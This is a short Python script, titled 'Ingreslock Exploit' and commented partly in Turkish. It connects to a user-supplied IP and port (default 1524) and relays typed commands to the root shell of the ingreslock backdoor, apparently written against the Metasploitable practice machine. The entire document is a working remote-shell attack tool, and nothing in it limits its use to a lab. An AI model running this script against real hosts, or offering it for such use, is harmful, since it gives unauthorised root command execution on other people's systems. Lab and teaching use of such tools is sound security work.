import socket
import time

def exploit_ingreslock(target_ip, target_port):
    try:
        print(f"[+] {target_ip}:{target_port} connecting...")
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        print("[+] Shell was obtained successfuly")
        print("[+] Enter 'exit' to quit.")
        
        while True:
            command = input("Shell> ").strip()
            
            if command.lower() == "exit":
                print("[+] Connection closing...")
                break
            
            s.sendall(command.encode('utf-8') + b'\n')
            time.sleep(0.5)  # Küçük bir bekleme süresi
            
            response = b""
            while True:
                chunk = s.recv(1024)
                response += chunk
                if len(chunk) < 1024:
                    break
            
            cleaned_response = response.decode('utf-8', errors='ignore').strip()
            
            # Prompt'u temizleme
            if "root@metasploitable:/#" in cleaned_response:
                cleaned_response = cleaned_response.replace("root@metasploitable:/#", "").strip()
            
            print(f"\n{cleaned_response}")
        
        s.close()
    except KeyboardInterrupt:
        print("\n[+] The user closed connection.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=== Ingreslock Exploit ===")
    
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port (default 1524): "))  # Kullanıcıdan port bilgisi alınıyor
    
    exploit_ingreslock(target_ip, target_port)
